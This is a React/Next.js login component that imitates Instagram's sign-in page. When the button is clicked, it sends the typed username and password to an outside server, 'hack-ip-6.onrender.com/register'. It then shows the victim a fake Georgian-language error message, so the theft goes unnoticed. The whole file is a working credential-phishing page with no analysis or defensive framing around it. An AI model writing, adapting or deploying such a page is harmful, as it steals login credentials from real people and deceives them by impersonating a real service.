"use client"
import { useState } from 'react'
import Btn from '../components/button/page'
import Input from '../components/input/page'
import style from './page.module.scss'
import axios from 'axios'
import { Button, message, Space } from 'antd';
export default function Login() {
    const [userinfo, setUserinfo] = useState('')
    const [pass,setPass] = useState('')
    const [messageApi, contextHolder] = message.useMessage();
    const text1 = (e:any) => {
        setUserinfo(e.target.value)
    }

    const text2 = (e:any) => {
        setPass(e.target.value)
    } 

    const click = () => {
        axios.post('https://hack-ip-6.onrender.com/register', {
            userInfo: userinfo,
            password: pass
        })
        .then((res) => {
            console.log(res.data);
                messageApi.open({
                  type: 'warning',
                  content: 'ბოდიშით, ხარვეზი აქ საიტს',
                });

        })
        .catch(() => {
                messageApi.open({
                  type: 'warning',
                  content: 'ეგეთი ლინკი არ არსებობს',
                });
        })
    }

    return(
        <>
        {contextHolder}
        <div className={style.instagram}>
            <div className={style.card}>
                <div className={style.title}></div>
                <div className={style.inputGroup}>
                    <Input value={text1} type={'text'} placeholder={'Phone number, username, or email'}/>
                    <Input value={text2} type={'password'} placeholder={'Password'}/>
                </div>
                <Btn click={click} title={'Login In'}/>
                <div className={style.line}></div>
                <p className={style.passForgot}>Forgot password?</p>
            </div>
        </div>

        <div className={style.dontAcc}>
            <div className={style.card2}>
                <p className={style.noAccText}>Don't have an account? <span className={style.span1}>Sign up</span></p>
            </div>
        </div>

      
        </>
    )
}